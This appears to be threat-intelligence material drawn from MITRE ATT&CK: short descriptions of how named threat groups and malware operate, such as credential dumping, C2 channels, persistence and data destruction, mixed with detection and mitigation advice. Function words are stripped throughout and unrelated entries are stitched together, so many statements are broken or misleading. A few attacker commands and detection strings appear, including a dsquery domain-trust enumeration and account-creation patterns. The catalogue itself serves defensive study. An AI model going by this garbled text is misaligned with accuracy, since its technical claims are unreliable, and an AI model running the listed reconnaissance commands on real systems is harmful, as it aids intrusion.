[FIN6](https://attack.mitre.org/groups/G0037) Metasploit Bind Reverse TCP stagers.(Citation: Trend Micro FIN6 October 2019) [NETWIRE](https://attack.mitre.org/software/S0198) ability communicate HTTP.(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) [Sowbug](https://attack.mitre.org/groups/G0054) named tools masquerade Windows Adobe Reader software, file adobecms.exe directory <code>CSIDL_APPDATA\microsoft\security</code>.(Citation: Symantec Sowbug Nov 2017) [ShimRat](https://attack.mitre.org/software/S0444) capability upload collected files C2.(Citation: FOX-IT 2016 Mofang)	 [Pysa](https://attack.mitre.org/software/S0583) functionality delete shadow copies.(Citation: CERT-FR PYSA April 2020)  [MESSAGETAP](https://attack.mitre.org/software/S0443) XOR-encrypted stored contents SMS messages matched target list. (Citation: FireEye MESSAGETAP October 2019) [Operation Spalax](https://attack.mitre.org/campaigns/C0005), threat actors XOR-encrypted payloads.(Citation: ESET Operation Spalax Jan 2021) [TeamTNT](https://attack.mitre.org/groups/G0139) RSA <code>authorized_keys</code>.(Citation: Aqua TeamTNT August 2020)(Citation: Cisco Talos Intelligence Group) (Citation: Haq 2014) [Patchwork](https://attack.mitre.org/groups/G0040) [PowerSploit](https://attack.mitre.org/software/S0194) download payloads, reverse shell, execute malware victim's machine.(Citation: Cymmetria Patchwork)(Citation: TrendMicro Patchwork Dec 2017) Monitor newly constructed network connections received untrusted hosts.  Monitor unexpected windows registry key accessed search Registry compromised systems insecurely stored credentials. (Citation: Crowdstrike MUSTANG PANDA June 2018)(Citation: Recorded Future REDDELTA July 2020) Monitor pods unexpected modifications settings control data deploy container environment facilitate execution evade defenses. [Mustang Panda](https://attack.mitre.org/groups/G0129) junk code DLL files hinder analysis.(Citation: Avira Mustang Panda January 2020) [Stuxnet](https://attack.mitre.org/software/S0603) SetSecurityDescriptorDacl API reduce object integrity levels.(Citation: Symantec W.32 Stuxnet Dossier) [TEMP.Veles](https://attack.mitre.org/groups/G0088) routinely deleted tools, logs, files finished them.(Citation: FireEye TRITON 2019) [OilRig](https://attack.mitre.org/groups/G0049) credential dumping tools [LaZagne](https://attack.mitre.org/software/S0349) steal credentials accounts logged compromised Outlook Access.(Citation: Unit 42 Playbook Dec 2017)(Citation: FireEye APT34 Webinar Dec 2017)(Citation: FireEye APT35 2018)(Citation: FireEye APT34 July 2019) [Bundlore](https://attack.mitre.org/software/S0482) execute JavaScript injecting victim's browser.(Citation: MacKeeper Bundlore Apr 2019) Monitor newly executed processes folders drives shared remote systems identifying sources gather precursor Collection identify potential systems Lateral Movement. user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. Monitor attempts enable scripts running considered suspicious. OLE Office XML files scanned ‘DDEAUTO', ‘DDE’, strings indicative DDE execution.https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/ (Citation: Threatpost Lizar 2021)(Citation: Gemini FIN7 Oct 2021) [Axiom](https://attack.mitre.org/groups/G0001) spear phishing initially compromise victims.(Citation: Cisco 72)(Citation: Novetta-Axiom) (Citation: CrowdStrike Grim Spider 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: FireEye KEGTAP SINGLEMALT October 2020) (Citation: FBI FLASH APT39 September 2020) [AppleSeed](https://attack.mitre.org/software/S0622) stage files central location prior exfiltration.(Citation: Malwarebytes Kimsuky June 2021) Monitor windows registry values modifying W32Time Registry. [DarkWatchman](https://attack.mitre.org/software/S0673) created scheduled task persistence.(Citation: Prevailion DarkWatchman 2021) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) executable detect removable media, USB flash drives.(Citation: ESET BackdoorDiplomacy Jun 2021) [Ember Bear](https://attack.mitre.org/groups/G1003) `cmd.exe` Windows Script Host (wscript) execute malicious code.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) (Citation: FireEye admin@338) [ROKRAT](https://attack.mitre.org/software/S0240) relied users clicking malicious attachment delivered spearphishing.(Citation: Malwarebytes RokRAT VBA January 2021) [Mivast](https://attack.mitre.org/software/S0080) capability download execute .exe files.(Citation: Symantec Backdoor.Mivast) (Citation: Symantec Shuckworm January 2022) Monitor executed commands arguments actions local account creation, user /add , useradd , dscl -create [PinchDuke](https://attack.mitre.org/software/S0048) collects user files compromised host based predefined file extensions.(Citation: F-Secure Dukes) [Pysa](https://attack.mitre.org/software/S0583) executed malicious executable naming svchost.exe.(Citation: CERT-FR PYSA April 2020) Monitor file files setuid setgid bits set. [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors relied victims executing malicious Word PDF files.(Citation: McAfee Sharpshooter December 2018)  [RTM](https://attack.mitre.org/software/S0148) security software victim.(Citation: ESET RTM Feb 2017) [Cardinal RAT](https://attack.mitre.org/software/S0348) sets <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load</code> executable.(Citation: PaloAlto CardinalRat Apr 2017) [APT39](https://attack.mitre.org/groups/G0087) malware disguised Mozilla Firefox tool named mfevtpse.exe proxy C2 communications, closely mimicking legitimate McAfee file mfevtps.exe.(Citation: BitDefender Chafer 2020)(Citation: FBI FLASH APT39 September 2020) Monitor access file resources local accounts <code>/etc/passwd</code>, <code>/Users</code> directories, SAM database. 

If access requires privileges, non-admin objects (such users processes) attempting access restricted file resources. [GoldMax](https://attack.mitre.org/software/S0588) check virtualized environment comparing collected MAC address <code>c8:27:cc:c2:37:5a</code>.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) [SombRAT](https://attack.mitre.org/software/S0615) execute <code>loadfromfile</code>, <code>loadfromstorage</code>, <code>loadfrommem</code> inject DLL  disk, storage, memory respectively.(Citation: BlackBerry CostaRicto November 2020) [APT28](https://attack.mitre.org/groups/G0007) tricked unwitting recipients clicking malicious hyperlinks emails crafted resemble trustworthy senders.(Citation: District Court Indictment GRU Oct 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) Monitor executed commands arguments connect remote shares, [Net](https://attack.mitre.org/software/S0039), command-line interface Discovery techniques remotely accessible systems.(Citation: Medium Detecting WMI Persistence) [DownPaper](https://attack.mitre.org/software/S0186) communicates C2 server HTTP.(Citation: ClearSky Charming Kitten Dec 2017) [Hikit](https://attack.mitre.org/software/S0009) supports peer connections.(Citation: Novetta-Axiom) Monitor user accounts logged systems access abnormal access patterns, multiple systems short period time. Correlate login activity remote services unusual behavior malicious suspicious activity. Adversaries learn environment relationships systems Discovery techniques prior attempting Lateral Movement. example, macOS review logs "screensharingd" "Authentication" event messages. (Citation: Lockboxx ARD 2019)(Citation: Apple Unified Log Analysis Remote Login Screen Sharing) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) tools download files, including DGet (a tool wget).(Citation: Secureworks BRONZE BUTLER Oct 2017) [KEYMARBLE](https://attack.mitre.org/software/S0271) customized XOR algorithm encrypt C2 communications.(Citation: US-CERT KEYMARBLE Aug 2018) [Spark](https://attack.mitre.org/software/S0543) exfiltrated data C2 channel.(Citation: Unit42 Molerat Mar 2020)  [TA505](https://attack.mitre.org/groups/G0092) deployed payloads Windows API calls compromised host.(Citation: Korean FSI TA505 2020) [RawDisk](https://attack.mitre.org/software/S0364) [Shamoon](https://attack.mitre.org/software/S0140) write protected locations MBR disk partitions effort destroy data.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [cmd](https://attack.mitre.org/software/S0106) delete files file system.(Citation: TechNet Del) [APT18](https://attack.mitre.org/groups/G0026) C2 communications.(Citation: PaloAlto DNS Requests 2016) [ROKRAT](https://attack.mitre.org/software/S0240) send collected data cloud storage services PCloud.(Citation: Malwarebytes RokRAT VBA January 2021)(Citation: Volexity InkySquid RokRAT August 2021) Monitor executed processes attempt listing network connections compromised accessing remote systems querying network. [NETWIRE](https://attack.mitre.org/software/S0198) payload injected benign executables process hollowing.(Citation: FireEye NETWIRE March 2019)(Citation: Red Canary NETWIRE January 2020) [RCSession](https://attack.mitre.org/software/S0662) gather compromised host.(Citation: Profero APT27 December 2020) [Remsec](https://attack.mitre.org/software/S0125) capable HTTPS C2.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report)(Citation: Kaspersky ProjectSauron Technical Analysis) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net share` command advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [Bandook](https://attack.mitre.org/software/S0234) AES encryption C2 communication.(Citation: CheckPoint Bandook Nov 2020) [Shamoon](https://attack.mitre.org/software/S0140) operational mode encrypting data overwriting it.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [Winnti Windows](https://attack.mitre.org/software/S0141) ability encrypt compress payload.(Citation: Novetta Winnti April 2015) Monitoring screen capture behavior depend method data operating write output files. Detection methods include collecting unusual processes API calls image data, monitoring image files written disk, <code>CopyFromScreen</code>, <code>xwd</code>, <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware). sensor data correlated events identify malicious activity, depending legitimacy behavior network environment. [Dtrack](https://attack.mitre.org/software/S0567) packs collected data password protected archive.(Citation: Securelist Dtrack) Monitor newly executed processes attempt domain-level permission settings. adversaries provisioned software compromised server (ex: command control server), internet scans reveal servers adversaries compromised. identifiable patterns services listening, certificates use, SSL/TLS negotiation features, response artifacts adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021) [SILENTTRINITY](https://attack.mitre.org/software/S0692) enumerate active Window keylogging execution `GetActiveWindowTitle`.(Citation: GitHub SILENTTRINITY Modules July 2019) [LockerGoga](https://attack.mitre.org/software/S0372) observed moving victim network SMB, indicating actors ransomware manually copying files form self-propagating.(Citation: Unit42 LockerGoga 2019) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Explosive](https://attack.mitre.org/software/S0569) commonly set file path attributes hidden.(Citation: CheckPoint Volatile Cedar March 2015) (Citation: Securelist APT10 March 2021) [APT28](https://attack.mitre.org/groups/G0007) [Tor](https://attack.mitre.org/software/S0183) variety commercial VPN services route brute force authentication attempts.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [WindTail](https://attack.mitre.org/software/S0466) ability automatically exfiltrate files macOS built-in utility /usr/bin/curl.(Citation: objective-see windtail2 jan 2019) [HAFNIUM](https://attack.mitre.org/groups/G0125) created granted privileges domain accounts.(Citation: Volexity Exchange Marauder March 2021) [Cadelspy](https://attack.mitre.org/software/S0454) ability discover compromised host.(Citation: Symantec Chafer Dec 2015) [Mis-Type](https://attack.mitre.org/software/S0084) injected running process, including `explorer.exe`.(Citation: Cylance Dust Storm) data reconnaissance phase, [Proxysvc](https://attack.mitre.org/software/S0238) grabs time send control server.(Citation: McAfee GhostSecret) [Turian](https://attack.mitre.org/software/S0647) create remote execute commands [cmd](https://attack.mitre.org/software/S0106).(Citation: ESET BackdoorDiplomacy Jun 2021) [Machete](https://attack.mitre.org/software/S0409) collects hostname target computer.(Citation: ESET Machete July 2019)  [menuPass](https://attack.mitre.org/groups/G0045) encrypted files exfiltration.(Citation: DOJ APT10 Dec 2018)(Citation: District Court NY APT10 Indictment December 2018) Monitor newly constructed files manipulate external outcomes hide activity Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) maliciously modify components victim environment hinder disable defensive mechanisms. Lack log events suspicious. [KillDisk](https://attack.mitre.org/software/S0607) attempted access token process calling <code>OpenProcessToken</code>. [KillDisk](https://attack.mitre.org/software/S0607) access token, attempt modify token privileges <code>AdjustTokenPrivileges</code>.(Citation: Trend Micro KillDisk 2) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363) public IP address compromised system.(Citation: Talos Frankenstein June 2019) [Amadey](https://attack.mitre.org/software/S1025) decoded antivirus strings.(Citation: Korean FSI TA505 2020) [Tonto Team](https://attack.mitre.org/groups/G0131) PowerShell download additional payloads.(Citation: ESET Exchange Mar 2021) [CARROTBALL](https://attack.mitre.org/software/S0465) custom base64 alphabet decode files.(Citation: Unit 42 CARROTBAT January 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) gzip archive dumped LSASS process memory RAR stage compress local folders.(Citation: FireEye APT35 2018)(Citation: DFIR Report APT35 ProxyShell March 2022) Monitor newly constructed processes unusual activity process network so) introduction files/programs. [Pupy](https://attack.mitre.org/software/S0192) Lazagne harvesting credentials.(Citation: GitHub Pupy) [build_downer](https://attack.mitre.org/software/S0471) ability download files C2 infected host.(Citation: Trend Micro Tick November 2019) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors deobfuscated Base64-encoded commands execution malicious script, revealed script designed additional payload.(Citation: Talos Frankenstein June 2019) [FinFisher](https://attack.mitre.org/software/S0182) checks parent process indications running sandbox setup.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [Wizard Spider](https://attack.mitre.org/groups/G0102) phishing emails link actor-controlled Google Drive document online file hosting services.(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: DFIR Ryuk 2 Hour Speed November 2020) [DarkWatchman](https://attack.mitre.org/software/S0673) search anti-virus products system.(Citation: Prevailion DarkWatchman 2021) (Citation: Unit42 SilverTerrier 2018) [ShimRatReporter](https://attack.mitre.org/software/S0445) collected network compiled report adversary-controlled C2.(Citation: FOX-IT 2016 Mofang) [OSInfo](https://attack.mitre.org/software/S0165) discovers current domain information.(Citation: Symantec Buckeye) [Psylo](https://attack.mitre.org/software/S0078) command conduct timestomping setting file’s timestamps match file System32 directory.(Citation: Scarlet Mimic Jan 2016) [SHUTTERSPEED](https://attack.mitre.org/software/S0217) capture screenshots.(Citation: FireEye APT37 Feb 2018) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) exfiltrates data channel C2.(Citation: ESET Sednit 2) [CosmicDuke](https://attack.mitre.org/software/S0050) exfiltrates collected files automatically FTP remote servers.(Citation: F-Secure Cosmicduke) Limit communications container service local Unix sockets remote access SSH. Require secure port access communicate APIs TLS disabling unauthenticated access Docker API Kubernetes API Server.(Citation: Docker Daemon Socket Protect)(Citation: Kubernetes API Control Access) [Sibot](https://attack.mitre.org/software/S0589) delete registry key server response received.(Citation: MSTIC NOBELIUM Mar 2021) [RogueRobin](https://attack.mitre.org/software/S0270) gathers BIOS versions manufacturers, CPU cores, total physical memory, name.(Citation: Unit 42 DarkHydrus July 2018) [FakeM](https://attack.mitre.org/software/S0076) C2 traffic attempts evade detection resembling data generated legitimate messenger applications, MSN Yahoo! messengers. Additionally, variants [FakeM](https://attack.mitre.org/software/S0076) modified SSL code communications C2 servers, SSL decryption ineffective.(Citation: Scarlet Mimic Jan 2016) [Micropsia](https://attack.mitre.org/software/S0339) creates hidden directory store components' outputs dedicated sub-folder each.(Citation: Radware Micropsia July 2018) (Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021) proper execution policy set, adversaries define execution policy administrator access, Registry command line. change policy detect malicious PowerShell. PowerShell environment, simply PowerShell execution detect malicious activity. beneficial PowerShell logging gain increased fidelity occurs execution (which applied .NET invocations). (Citation: Malware Archaeology PowerShell Cheat Sheet) PowerShell 5.0 introduced enhanced logging capabilities, features PowerShell 4.0. Earlier versions PowerShell logging features.(Citation: FireEye PowerShell Logging 2016) organization gather PowerShell execution details data analytic platform supplement data. [Tonto Team](https://attack.mitre.org/groups/G0131) exploited CVE-2019-0803 MS16-032 escalate privileges.(Citation: TrendMicro Tonto Team October 2020) monitoring social media activity organization. Suspicious activity include personas claiming organization created/modified accounts numerous connection requests accounts affiliated organization.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)). [RATANKBA](https://attack.mitre.org/software/S0241) uploads downloads information.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) Monitor executed commands arguments command history console running memory determine unauthorized suspicious commands modify device configuration. [TrickBot](https://attack.mitre.org/software/S0266) downloads additional files saves victim's machine.(Citation: Trend Micro Totbrick Oct 2016)(Citation: Bitdefender Trickbot VNC module Whitepaper 2021) [OilRig](https://attack.mitre.org/groups/G0049) <code>tasklist</code> victim's machine.(Citation: Palo Alto OilRig 2016) [CrackMapExec](https://attack.mitre.org/software/S0488) execute PowerShell commands WMI.(Citation: CME Github September 2018) [IceApple](https://attack.mitre.org/software/S1022) Result Retriever module AES encrypt C2 responses.(Citation: CrowdStrike IceApple 2022) [Azorult](https://attack.mitre.org/software/S0344) collect host IP victim’s machine.(Citation: Unit42 Azorult Nov 2018) [TinyZBot](https://attack.mitre.org/software/S0004) keylogger functionality.(Citation: Cylance Cleaver) [SUNBURST](https://attack.mitre.org/software/S0559) collected username compromised host.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Analyzing Solorigate Dec 2020) [Misdat](https://attack.mitre.org/software/S0083) attempted detect compromised host Japanese keyboard Windows API `GetKeyboardType`.(Citation: Cylance Dust Storm) [ProLock](https://attack.mitre.org/software/S0654) CVE-2019-0859 escalate privileges compromised host.(Citation: IB Ransomware September 2020) Monitor executed commands arguments actions remove overwrite logs. (Citation: FireEye Clandestine Wolf) (Citation: US-CERT BLINDINGCAN Aug 2020) Data loss prevention restrict access sensitive data detect sensitive data unencrypted. [Trojan.Mebromi](https://attack.mitre.org/software/S0001) performs BIOS modification download execute file protect removal.(Citation: 2011) [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) EarthWorm network tunneling SOCKS5 server port transfer functionalities.(Citation: ESET BackdoorDiplomacy Jun 2021) [Carbanak](https://attack.mitre.org/software/S0030) encodes message body traffic Base64.(Citation: Kaspersky Carbanak)(Citation: FireEye CARBANAK June 2017) [Sowbug](https://attack.mitre.org/groups/G0054) credential dumping tools.(Citation: Symantec Sowbug Nov 2017) [PoetRAT](https://attack.mitre.org/software/S0428) ability screen captures.(Citation: Talos PoetRAT April 2020)(Citation: Dragos Threat Report 2020) (Citation: Trend Micro Muddy Water March 2021) [Indrik Spider](https://attack.mitre.org/groups/G0119) downloaded additional scripts, malware, tools compromised host.(Citation: Crowdstrike Indrik November 2018)(Citation: Symantec WastedLocker June 2020) [Catchamas](https://attack.mitre.org/software/S0261) obtains application windows titles determines windows perform [Screen Capture](https://attack.mitre.org/techniques/T1113) on.(Citation: Symantec Catchamas April 2018) [APT41](https://attack.mitre.org/groups/G0096) executed <code>file /bin/pwd</code> exploited victims, return architecture information.(Citation: FireEye APT41 March 2020) Monitor files abuse task scheduling functionality facilitate initial recurring execution malicious code. [More_eggs](https://attack.mitre.org/software/S0284) regsvr32.exe execute malicious DLL.(Citation: Security Intelligence Eggs Aug 2019) [Derusbi](https://attack.mitre.org/software/S0021) capable capturing video.(Citation: FireEye Periscope March 2018) [Nltest](https://attack.mitre.org/software/S0359) enumerate parent domain local machine <code>/parentdomain</code>.(Citation: Nltest Manual) [Okrum](https://attack.mitre.org/software/S0439) keylogger tool capture keystrokes. (Citation: ESET Okrum July 2019) [RDAT](https://attack.mitre.org/software/S0495) DNS C2 communications functioning.(Citation: Unit42 RDAT July 2020)	 [Silent Librarian](https://attack.mitre.org/groups/G0122) publicly tools including SingleFile HTTrack login targeted organizations.(Citation: Proofpoint TA407 September 2019)(Citation: Secureworks COBALT DICKENS September 2019) [ZxxZ](https://attack.mitre.org/software/S1013) collect username compromised host.(Citation: Cisco Talos Bitter Bangladesh 2022) [Cobalt Strike](https://attack.mitre.org/software/S0154) conduct peer-to-peer communication Windows named pipes encapsulated SMB protocol. protocols standard assigned ports.(Citation: cobaltstrike manual)(Citation: Talos Cobalt Strike September 2020) [Ramsay](https://attack.mitre.org/software/S0458) included embedded Visual Basic scripts malicious documents.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [BISCUIT](https://attack.mitre.org/software/S0017) communicates C2 server custom protocol.(Citation: Mandiant APT1 Appendix) [AuditCred](https://attack.mitre.org/software/S0347) XOR RC4 perform decryption code functions.(Citation: TrendMicro Lazarus Nov 2018) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors established identified email account register variety domains campaign.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: Dragos Crashoverride 2018) Monitor executed commands arguments arguments actions collect combine files. Remote access tools built-in features interact Windows API gather location. Data acquired staged Windows management tools Windows Management Instrumentation PowerShell. [Winnti Windows](https://attack.mitre.org/software/S0141) dropper decrypt decompresses data blob.(Citation: Novetta Winnti April 2015) [CSPY Downloader](https://attack.mitre.org/software/S0527) search loaded modules, PEB structure, file paths, Registry keys, memory determine debugged running virtual environment.(Citation: Cybereason Kimsuky November 2020) [Amadey](https://attack.mitre.org/software/S1025) collected user compromised host `GetUserNameA`.(Citation: BlackBerry Amadey 2020) (Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: Check Pay2Key November 2020) [Waterbear](https://attack.mitre.org/software/S0579) identify process specific security product.(Citation: Trend Micro Waterbear December 2019) [Koadic](https://attack.mitre.org/software/S0250) SSL TLS communications.(Citation: Github Koadic) [FinFisher](https://attack.mitre.org/software/S0182) probes check antimalware processes.(Citation: FinFisher Citation)(Citation: Securelist BlackOasis Oct 2017) Monitor Fine-Grained Password Policies regularly audit user accounts settings.(Citation: dump_pwd_dcsync) [Dragonfly](https://attack.mitre.org/groups/G0035) attempted brute force credentials gain access.(Citation: CISA AA20-296A Berserk Bear December 2020) (Citation: FireEye APT29 Nov 2018)(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Cybersecurity Advisory SVR TTP 2021)(Citation: MSTIC NOBELIUM 2021)(Citation: MSTIC Nobelium Toolset 2021)(Citation: SentinelOne NobleBaron June 2021)(Citation: ESET T3 Threat Report 2021)(Citation: Secureworks IRON RITUAL Profile)(Citation: Secureworks IRON RITUAL USAID Phish 2021) [WannaCry](https://attack.mitre.org/software/S0366) [Tor](https://attack.mitre.org/software/S0183) command control traffic routes custom cryptographic protocol [Tor](https://attack.mitre.org/software/S0183) circuit.(Citation: SecureWorks WannaCry Analysis) Public Key Pinning (HPKP) method mitigate potential [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) situations adversary mis-issued fraudulent certificate intercept encrypted communications enforcing expected certificate. (Citation: Wikipedia HPKP) [Dyre](https://attack.mitre.org/software/S0024) ability inject code browser process.(Citation: Malwarebytes Dyreza November 2015) [Ursnif](https://attack.mitre.org/software/S0386) droppers WMI classes execute [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands.(Citation: Bromium Ursnif Mar 2017) (Citation: FireEye APT32 2017) Office-related persistence mechanisms require Registry binaries, files, scripts written disk existing files modified include malicious scripts. Collect events Registry key creation modification Office-based persistence.(Citation: CrowdStrike Outlook Forms)(Citation: Outlook Page) Monitor Registry <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options</code>. [Conti](https://attack.mitre.org/software/S0575) spread infecting remote machines network shared drives.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)  [Agent Tesla](https://attack.mitre.org/software/S0331) achieve persistence modifying Registry key entries.(Citation: SentinelLabs Agent Tesla Aug 2020)  [APT38](https://attack.mitre.org/groups/G0082) PowerShell execute commands operational tasks.(Citation: CISA AA20-239A BeagleBoyz August 2020) [FELIXROOT](https://attack.mitre.org/software/S0267) collects username victim’s machine.(Citation: FireEye FELIXROOT July 2018)(Citation: ESET GreyEnergy Oct 2018) [CSPY Downloader](https://attack.mitre.org/software/S0527) packed UPX.(Citation: Cybereason Kimsuky November 2020) [APT39](https://attack.mitre.org/groups/G0087) communications C2.(Citation: BitDefender Chafer 2020)(Citation: FBI FLASH APT39 September 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) domains host payloads.(Citation: Palo Alto Black-T October 2020) [Bazar](https://attack.mitre.org/software/S0534) decrypt downloaded payloads. [Bazar](https://attack.mitre.org/software/S0534) resolves strings artifacts runtime.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) Monitor attempt user abuse credentials existing accounts gaining Initial Access, Persistence, Privilege Escalation, Defense Evasion.  [MiniDuke](https://attack.mitre.org/software/S0051) HTTPS command control.(Citation: F-Secure Dukes)(Citation: ESET Dukes October 2019) Monitor registration joining device objects Active Directory. Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [Cobalt Strike](https://attack.mitre.org/software/S0154) Python perform execution.(Citation: Cobalt Strike TTPs Dec 2017)(Citation: CobaltStrike Daddy 2017)(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [adbupd](https://attack.mitre.org/software/S0202) cmd.exe.(Citation: PLATINUM April 2016) [Sandworm Team](https://attack.mitre.org/groups/G0034) registered domain names created URLs designed mimic spoof legitimate websites, email login pages, online file sharing storage websites, password reset pages.(Citation: District Court Indictment GRU Unit 74455 October 2020) [Dipsind](https://attack.mitre.org/software/S0200) variant C2 mechanism port knocking attackers connect victim leaving connection sectonds.(Citation: PLATINUM April 2016) [Turian](https://attack.mitre.org/software/S0647) retrieve including OS version, memory usage, local hostname, adapter information.(Citation: ESET BackdoorDiplomacy Jun 2021) Monitor processes accessed root access (allowing read securityd’s memory), scan memory correct sequence decrypt user’s logon keychain. [Kazuar](https://attack.mitre.org/software/S0265) gathers local victim’s machine.(Citation: Unit 42 Kazuar 2017) variant [BlackEnergy](https://attack.mitre.org/software/S0089) locates existing driver services disabled drops driver component service's paths, replacing legitimate executable. malware sets hijacked service start automatically establish persistence.(Citation: F-Secure BlackEnergy 2014) (Citation: Malwarebytes Higaisa 2020) [DarkComet](https://attack.mitre.org/software/S0334) keylogging capability.(Citation: TrendMicro DarkComet Sept 2014) [KOCTOPUS](https://attack.mitre.org/software/S0669) VBScript wscript execute PowerShell command.(Citation: MalwareBytes LazyScripter Feb 2021) (Citation: IB Silence Sept 2018) [Lokibot](https://attack.mitre.org/software/S0447) tricked recipients enabling malicious macros victims "enable content" email attachments.(Citation: TrendMicro Msiexec Feb 2018)(Citation: Talos Lokibot Jan 2021) laterally victim network, [FIN6](https://attack.mitre.org/groups/G0037) credentials stolen systems gathered usernames password hashes.(Citation: FireEye FIN6 April 2016)(Citation: FireEye FIN6 Apr 2019)(Citation: Visa FIN6 Feb 2019) (Citation: Volexity PowerDuke November 2016) [DarkHydrus](https://attack.mitre.org/groups/G0079) leveraged PowerShell download execute additional scripts execution.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit 42 Playbook Dec 2017) [JHUHUGIT](https://attack.mitre.org/software/S0044) performs code injection injecting functions browser processes.(Citation: F-Secure Sofacy 2015)(Citation: Unit 42 Sofacy Feb 2018) Administrators perform audit access lists permissions granted access applications services. extensively resources establish baseline, periodic audits updated resources. Suspicious accounts/credentials investigated removed.
 
Enable advanced auditing ADFS. Check success failure audit options ADFS Management snap-in. Enable Audit Application Generated events FS farm Policy Object.(Citation: FireEye ADFS) [PowerSploit](https://attack.mitre.org/software/S0194) collection Exfiltration modules harvest credentials Windows vault credential objects.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) [Chrommme](https://attack.mitre.org/software/S0667) collect data local system.(Citation: ESET Gelsemium June 2021) [SUGARDUMP](https://attack.mitre.org/software/S1042) variants required user enable macro malicious .xls file execution.(Citation: Mandiant UNC3890 Aug 2022) [Stuxnet](https://attack.mitre.org/software/S0603) RPC server file dropping routine support payload version updates P2P communications victim network.(Citation: Symantec W.32 Stuxnet Dossier) [Zeus Panda](https://attack.mitre.org/software/S0330) checks processes meet requirements, injects process.(Citation: GDATA Zeus Panda June 2017) [Silence](https://attack.mitre.org/groups/G0091) emails malicious DOCX, CHM, LNK ZIP attachments. (Citation: Cyber Forensicator Silence Jan 2019)(Citation: SecureList Silence Nov 2017)(Citation: IB Silence Sept 2018) [Zeroaccess](https://attack.mitre.org/software/S0027) kernel-mode rootkit.(Citation: Sophos ZeroAccess) Monitor activation invocation instance (ex: instance.start GCP Audit Logs) [Patchwork](https://attack.mitre.org/groups/G0040) payloads download additional files C2 server.(Citation: Securelist Dropping Elephant)(Citation: TrendMicro Patchwork Dec 2017) [APT28](https://attack.mitre.org/groups/G0007) Google Drive C2.(Citation: TrendMicro Pawn Storm Dec 2020) Configure applications application bundle structure leverages <code>/Resources</code> folder location.(Citation: Apple App Security Overview)  [InvisiMole](https://attack.mitre.org/software/S0260) check presence network sniffers, AV, BitDefender firewall.(Citation: ESET InvisiMole June 2020) [Andariel](https://attack.mitre.org/groups/G0138) hidden malicious executables PNG files.(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021)(Citation: Kaspersky Andariel Ransomware June 2021) [dsquery](https://attack.mitre.org/software/S0105) gather domain trusts <code>dsquery * -filter "(objectClass=trustedDomain)" -attr *</code>.(Citation: Harmj0y Domain Trusts) [SynAck](https://attack.mitre.org/software/S0242) enumerates running processes.(Citation: SecureList SynAck Doppelgänging 2018)(Citation: Kaspersky Lab SynAck 2018) Monitor executed commands arguments search collect local sources, file systems local databases, files sensitive data prior Exfiltration. Remote access tools built-in features interact Windows API gather data. Data acquired Windows management tools [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) [PowerShell](https://attack.mitre.org/techniques/T1059/001).

